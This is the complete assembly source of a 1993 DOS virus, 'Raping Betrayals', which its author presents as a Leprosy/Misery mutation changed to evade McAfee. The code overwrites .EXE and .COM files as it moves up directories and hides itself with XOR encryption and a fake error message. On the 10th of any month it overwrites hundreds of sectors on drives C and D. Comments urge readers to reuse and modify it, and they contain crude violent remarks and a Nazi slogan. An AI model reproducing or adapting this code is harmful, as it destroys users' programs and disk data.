; VirusName: Raping Betrayals
; Country  : Sweden
; Author   : The Unforgiven / Immortal Riot
; Date     : 15/09/1993
;
;
; This is an mutation of Misery from Immortal Riot.
; I mutated this one, cuz Mcafee scan grabbed it
; within one month after we released it. So, now
; "Misery" is called "Raping Betrayls". Many
; thanks to PCM2 for the original Leprosy virus.
;
; Okey..In this version I just changed the new
; Mcafee "Scan-String", by remarking some calls.
; I also added a day checker, and if the
; virus (or a infected file) is run at the 10:th
; any month, procedure "ellie" will go off..  
; Ellie is some sort of heart breaker!..<..hehe..>      
;
; It copies itself into other exe/com files on the current
; drive. The file-size will not be changed, cuz it just
; replaces the code in the beginning with itselves. The
; infected files will not work, instead the virus will 
; run again. The virus uses dot-dot metod for changing dirs. 
;
; There has been many mutations born from Leprosy,
; and here we give you yet another contribution...
; 
; McaFee Scan v108 can't find it, neither can S&S Toolkit 6.54
; Havn't tried with TBScan/F-prot, but they will probably
; identify it as "Leprosy".
;
;  Regards : The Unforgiven / Immortal Riot 

Title   Raping Betrayals	   ; By The Unforgiven / Immortal Riot
 
cr              equ     13         ;  Carriage return ASCII code
lf              equ     10         ;  Linefeed ASCII code
tab             equ     9          ;  Tab ASCII code
virus_size      equ     664        ;  Size of the virus file
code_start      equ     100h       ;  Address right after PSP in memory
dta             equ     80h        ;  Addr of default disk transfer area
datestamp       equ     24         ;  Offset in DTA of file's date stamp
timestamp       equ     22         ;  Offset in DTA of file's time stamp
filename        equ     30         ;  Offset in DTA of ASCIIZ filename
attribute       equ     21         ;  Offset in DTA of file attribute
 
 				   
        code    segment 'code'     ;  Open code segment
        assume  cs:code,ds:code    ;  One segment for both code & data
                org     code_start ;  Start code image after PSP
 
; ÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;  All executable code is contained in boundaries of procedure "main".
;  The following code, until the start of "virus_code", is the non-
;  encrypted CMT portion of the code to load up the real program.
; ÄÄ-ÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
main    proc    near                    ;  Code execution begins here

        call    encrypt_decrypt         ;  Decrypt the real virus code
        jmp     random_mutation         ;  Put the virus into action
encrypt_val     db      00h             ;  Hold value to encrypt by here
 
; Ä-ÄÄÄ--ÄÄ-  Encrypt, save, and restore the virus code  ÄÄÄ--ÄÄ--Ä-ÄÄ
infect_file:
        mov     bx,handle            ;  Get the handle
        push    bx                   ;  Save it on the stack
  
;       call    encrypt_decrypt      ;  Encrypt most of the code
        pop     bx                   ;  Get back the handle
        mov     dx,code_start        ;  Buffer where code starts in memory
        mov     cx,virus_size        ;  Total number of bytes to write
      
        mov     ah,40h               ;  DOS write-to-handle service
        int     21h                  ;  Write the virus code into the file
;       call    encrypt_decrypt      ;  Restore the code as it was
     	call 	daycheck             ;  Call function who check's for day.  
        ret                          ;  Go back to where you came from
 
;      ÄÄ-ÄÄÄÄ-ÄÄ  Encrypt or decrypt the virus code ; ÄÄ-ÄÄÄÄ--ÄÄÄÄÄÄ-Ä 

encrypt_decrypt:
         mov     bx,offset virus_code   ;  Get address to start 
					;  encrypt/decrypt
xor_loop:                               ;  Start cycle here
        mov     ah,[bx]                 ;  Get the current byte
        xor     al,encrypt_val          ;  En/dis-engage XOR scheme on it
        mov     [bx],ah                 ;  Put it back where we got it
        inc     bx                      ;  Move BX ahead a byte
        cmp     bx,offset virus_code+virus_size  ;  Are we at the end?
        jle     xor_loop                ;  If not, do another cycle
        ret                             ;  and go back where we came from
 
; ÄÄ-ÄÄÄÄÄ---ÄÄÄÄÄ--ÄÄÄ--ÄÄÄ--ÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ----ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;   The rest of the code from here on remains encrypted until run-time,
;   using a fundamental XOR technique that changes via CMT.
; ÄÄ-ÄÄÄÄÄÄ--Ä-ÄÄÄÄÄÄÄÄ--ÄÄÄ---ÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--Ä-Ä-ÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
virus_code:
 
; ÄÄ-ÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄ--ÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
;  "All strings are kept here in the file, and automatically encrypted"
;  Okey..Thanks	to Cybernetic Mutation Technology(tm), for this, but
;  the virus is pretty un-use-less if Mcafee scan catch is so, I 
;  changed a few calls, and you can have phun with this again...
; ÄÄ-ÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄ-Ä--ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
exe_filespec    db      "*.EXE",0 ; To infect EXE's
com_filespec    db      "*.COM",0 ; To infect COM's
newdir          db      "..",0    ; Move up one directory
; ÄÄ-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
; Fake_msg is the message that will be printed on the screen, after
; it has infected files (or when a infected file is run).
; ÄÄ-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄ---ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ-Ä
fake_msg     db cr,lf,"Program too big to fit in memory$"
virus_msg1   db cr,lf,tab,"Betrayal is a sin, if it comes from another..$"
	     db	" The Unforgiven / Immortal Riot " ; HUmm..that's me..
	     db	" Dedicated to Ellie! - Lurve you! "; Love ya Ellie!
	     db	" Sweden 15/09/93 "		    ; written..
; ÄÄ-ÄÄÄÄÄÄÄ----ÄÄÄ-ÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
; Okey..these messages just are just "file-size out-fillers" or something,
; nothing important..so I remarked them, and the virus is a bit smaller...
; also check in prodedure "Exit_virus" for more info about ‚m..

;virus_msg2  db  cr,lf,tab," Something was placed here before..     $"
;virus_msg3  db  cr,lf,tab," But now, it's all gone, black, sad      $"
;virus_msg4  db  cr,lf,tab," and empty. Empty places i my mind,      $"
;virus_msg5  db  cr,lf,tab," heart, life, and soul, yes, it's a sin. $"
; ÄÄ-ÄÄÄÄÄÄÄÄ---ÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä

compare_buf     db      20 dup (?)      ;  Buffer to compare files in
files_found     db      ?
files_infected  db      ?
orig_time       dw      ?
orig_date       dw      ?
orig_attr       dw      ?
handle          dw      ?
success         db      ?

random_mutation:                    ; First decide if virus is to mutate
        mov     ah,2ch              ; Set up DOS function to get time
        int     21h
        cmp     encrypt_val,0       ; Is this a first-run virus copy?
        je      install_val         ; If so, install whatever you get.
        cmp     dh,15               ; Is it less than 16 seconds?
        jg      find_extension      ; If not, don't mutate this time
install_val:
        cmp     dl,0                ; Will we be encrypting using zero?
        je      random_mutation     ; If so, get a new value.
        mov     encrypt_val,dl      ; Otherwise, save the new value
find_extension:                     ; Locate file w/ valid extension
        mov     files_found,0       ; Count infected files found
        mov     files_infected,4    ; BX counts file infected so far
        mov     success,0
find_exe:
        mov     cx,00100111b            ; Look for all flat file attribs
        mov     dx,offset exe_filespec  ; Check for .EXE extension first
        mov     ah,4eh                  ; Call DOS find first service
        int     21h
        cmp     ax,12h                  ; Are no files found?
        je      find_com                ; If not, nothing more to do
        call    find_healthy            ; Try to find healthy .EXE
find_com:
        mov     cx,00100111b            ; Look for all flat file attribs   
        mov     dx,offset com_filespec  ; Check for .COM extension now
        mov     ah,4eh                  ; Call DOS find first service
        int     21h
        cmp     ax,12h                  ; Are no files found?
        je      chdir                   ; If not, step back a directory
        call    find_healthy            ; Try to find healthy .COM
chdir:                                  ; Routine to step back one level
        mov     dx,offset newdir        ; Load DX with address of pathname
        mov     ah,3bh                  ; Change directory DOS service
        int     21h
        dec     files_infected          ; This counts as infecting a file
        jnz     find_exe                ; If "yes", find another
        jmp     exit_virus              ; Otherwise let's pack it up
find_healthy:
        mov     bx,dta                  ; Point BX to address of DTA
        mov     ax,[bx]+attribute       ; Get the current file's attribs  
        mov     orig_attr,ax            ; Save it
        mov     ax,[bx]+timestamp       ; Get current file's time stamp
        mov     orig_time,ax            ; Save it
        mov     ax,[bx]+datestamp       ; Get current file's data stamp
        mov     orig_date,ax            ; Save it
        mov     dx,dta+filename         ; Get filename to change attribute
        mov     cx,0                    ; Clear all attribute bytes
        mov     al,1                    ; Set attribute sub-function
        mov     ah,43h                  ; Call DOS service to do it
        int     21h
        mov     al,2                    ; Open handle for read/write
        mov     ah,3dh                  ; Open file handle DOS service
        int     21h
        mov     handle,ax               ; Save the file handle
        mov     bx,ax                   ; Move the handle to BX for read
        mov     cx,20                   ; Read in the top 20 bytes of file
        mov     dx,offset compare_buf   ; Use the small buffer up top
        mov     ah,3fh                  ; DOS read-from-handle service
        int     21h
        mov     bx,offset compare_buf   ; Adjust the encryption value
        mov     ah,encrypt_val          ; for accurate comparison
        mov     [bx+6],ah
        mov     si,code_start           ; One array to compare is this file
        mov     di,offset compare_buf   ; The other array is the buffer
        mov     ax,ds                   ; Transfer the DS register...
        mov     es,ax                   ; ...to the ES register
        cld
        repe    cmpsb                   ; Compare the buffer to the virus
        jne     healthy                 ; If different, the file is healthy 
        call    close_file              ; Close it up otherwise
        inc     files_found             ; Chalk up another fucked up file
continue_search:
        mov     ah,4fh                  ; Find next DOS function
        int     21h                     ; Try to find another file
        cmp     ax,12h                  ; Are there any more files?
        je      no_more_found           ; If not, get outta here
        jmp     find_healthy            ; Try the process on this one
no_more_found:
        ret                             ; Go back to where we came from
healthy:
        mov     bx,handle               ; Get the file handle
        mov     ah,3eh                  ; Close it for now
        int     21h
        mov     ah,3dh                  ; Open it again, to reset it
        mov     dx,dta+filename
        mov     al,2
        int     21h
        mov     handle,ax           ; Save the handle again
        call    infect_file         ; Infect the healthy file
        call    close_file          ; Close down this operation
        inc     success             ; Indicate we did something this time
        dec     files_infected      ; Scratch off another file on agenda
        jz      exit_virus          ; If we're through, terminate
        jmp     continue_search     ; Otherwise, try another
        ret
close_file:
        mov     bx,handle           ; Get the file handle off the stack
        mov     cx,orig_time        ; Get the date stamp
        mov     dx,orig_date        ; Get the time stamp
        mov     al,1                ; Set file date/time sub-service
        mov     ah,57h              ; Get/Set file date and time service
        int     21h                 ; Call DOS
        mov     bx,handle
        mov     ah,3eh              ; Close handle DOS service
        int     21h		 
        mov     cx,orig_attr        ; Get the file's original attribute
        mov     al,1                ; Instruct DOS to put it back there
        mov     dx,dta+filename     ; Feed it the filename
        mov     ah,43h              ; Call DOS
        int     21h
        ret			    ; Returning to base...

; ÄÄ-ÄÄÄÄÄ-ÄÄÄÄÄ-ÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ-Ä--ÄÄÄÄÄÄ-ÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
; ELLIE:
;       mov     ah,09h                  ; Read under                 
;       mov     dx,offset virus_msg1	; for more              
;       int     21h			; information                         
;
; Okey..If it's 10:th (any month), the virus will do something with 
; your hard-drives (..ellie..) which I finds to be real nasty ! If
; you wanna check if the function day-check works, just un-mark
; the tree lines under the first "ellie". and the virus_msg1 
; "Betrayal is a sin, if it comes from another" will be	displayed.
; ÄÄ-ÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ-ÄÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
; Here is the real "Ellie"..Yeah..that's certainly her!		       
; ÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-Ä
ELLIE:					; Here comes the bitch..
	cli				; Tigh her up!      
	mov	ah,2			; starting with drive C
	cwd				; starting at sector 0 
	mov	cx,0100h		; write 256 sectors
	int	026h			; to protect and serve..
	jmp	maria			; Next victim is Maria..

MARIA:					;Yet another..
	MOV	AL,3			;Set to fry drive D
	MOV	CX,700			;Set to write 700 sectors
	MOV	DX,00			;Starting at sector 0
	MOV	DS,[DI+99]		;Put random crap in DS
	MOV	BX,[DI+55]		;More crap in BX
	CALL	ELLIE			;Jump for joy!...

; ÄÄ-ÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ-ÄÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-ÄÄÄÄ-
; If you want Ellie to go off on some special month, just look at procedure
; "Infect_file", and the call to daycheck. Change the call to Monthcheck,
; and "delete" the ";" on procedure monthcheck. But remember, that makes,
; the virus much less destructive, and by that time, all scanners has
; probably added a new scan-string on this one.	Now it will go off the
; 10:th every month. Feel free to modify this as much you want to.

; MONTHCHECK:		 ; Procudure to check                     
;  	mov ah,2ah	 ; what month it is..
;  	int 21h		 ; Dos to your service..                      
;  	cmp dh,06  	 ; comp dh,06 (July, month 06)
;	je  daycheck	 ; if month 06, jump to daycheck,
; 	JMP something 	 ; if not, just jump to something..
; ÄÄ-ÄÄÄ-ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄÄÄÄÄÄ--ÄÄÄÄÄÄÄ-ÄÄÄÄÄÄÄ-ÄÄÄÄÄÄÄÄ-ÄÄÄÄÄ-ÄÄÄÄ-

Daycheck:		 ; check what day it is..
	mov ah,2ah	 ;
	int 21h		 ; Dos to your service..
	cmp dl,10	 ; If it is the 10:th,
	je  ellie    	 ; if yes, have a great fuck..
	JMP something	 ; if not..just can tell you how sorry I'm !

Something:		 ; Some stupid procedure..but remember..
ret			 ; Arbeit Macht Frei !

exit_virus:
        cmp     files_found,15          ; Are at least 15 files infected?
        jl      print_fake              ; If not, keep a low profile
        cmp     success,0               ; Did we infect anything?
        jg      print_fake              ; If so, cover it up
        mov     ah,09h                  ; Use DOS print string service
        mov     dx,offset virus_msg1    ; Load address of the first line
        int     21h                     ; Print it..
    ;   mov     dx,offset virus_msg2    ; ---                 
    ;   int     21h                     ; Okey..mess(ages) 2-5 have been 
    ;   mov     dx,offset virus_msg3	; removed from the code..too bad,
    ;   int     21h			; they were Metallica messages...
    ;   mov     dx,offset virus_msg4	; ---                 
    ;   int	21h			; Anyway, (ab)use this program, B4
    ;   mov dx,offset virus_msg5	; Mcafee gets a new string for this 
    ;   int     21h			; ---                  
        jmp     terminate		; Jump to terminate..

print_fake:
        mov     ah,09h                  ; Print fake error message
        mov     dx,offset fake_msg	; Print "fake_msg"
        int     21h			; Dos to your service..            
terminate:				; Get ready for quit this program
        mov     ah,4ch                  ; DOS terminate process function
        int     21h                     ; Exit..
 
filler          db       8 dup (90h)    ; Pad out to 666 bytes
 
main    endp
code    ends
        end     main
 
; Greeting goes out to : Raver, Metal Militia, Scavenver,
; and of-cuz to Miss Perfect...ELLIE!